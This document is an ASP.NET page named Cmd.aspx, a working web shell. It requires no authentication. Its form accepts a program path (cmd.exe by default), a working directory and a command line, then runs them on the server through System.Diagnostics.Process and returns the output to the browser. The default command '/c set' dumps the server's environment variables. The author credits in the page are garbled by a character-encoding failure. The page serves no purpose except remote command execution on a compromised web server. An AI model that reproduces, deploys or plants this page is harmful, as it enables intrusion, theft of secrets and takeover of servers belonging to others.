<%@ Page Language="C#" AutoEventWireup="true"%>
<%@ import Namespace="System.Diagnostics"%>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server" language="C#">
    protected void Page_Load(object sender, EventArgs e)
    {
        if(!IsPostBack) curdir.Text = Server.MapPath(".");
    }
    protected string RunCmd(string path, string cmd, string curdir)
    {
        string retval = "";

        try
        {
            Process p = new Process();
            p.StartInfo.FileName = path;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.WorkingDirectory = curdir;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.Arguments = cmd;
            p.Start();
            p.StandardInput.WriteLine("exit");
            retval = "\r\n----------- ���н�� --------------\r\n";
            retval += p.StandardOutput.ReadToEnd();
            retval += "\r\n----------- ������� --------------\r\n";
            retval += p.StandardError.ReadToEnd();
        }
        catch (Exception err)
        {
            retval = err.Message;
        }

        return retval;
    }
    protected void Execute_Click(object sender, EventArgs e)
    {
        string path = cmdpath.Text;
        string cmd = cmdline.Text;
        string wkdir = curdir.Text;

        result.Text = RunCmd(path, cmd, wkdir);
    }
    
</script>
<html xmlns="http://www.w3.org/1999/xhtml" >
<head runat="server">
    <title>��ü���� and Cmd.aspx</title>
</head>
<body>
    <form id="form1" runat="server">
    <div style="text-align: left">
        <span style="color: #ff99ff">Cmd.aspx powered by ��ü����<br />
            <br />
        </span>CMD Path:<asp:TextBox ID="cmdpath" runat="server" Width="755px">c:\windows\system32\cmd.exe</asp:TextBox><br />
        CurrentDir:<asp:TextBox ID="curdir" runat="server" Width="755px"></asp:TextBox><br />
        CMD Line:<asp:TextBox ID="cmdline" runat="server" Width="756px">/c set</asp:TextBox>
        <asp:Button ID="Execute" runat="server" OnClick="Execute_Click" Text="Execute" /><br />
        <br />
        <asp:TextBox ID="result" runat="server" Height="460px" TextMode="MultiLine" Width="901px"></asp:TextBox></div>
    </form>
</body>
</html>
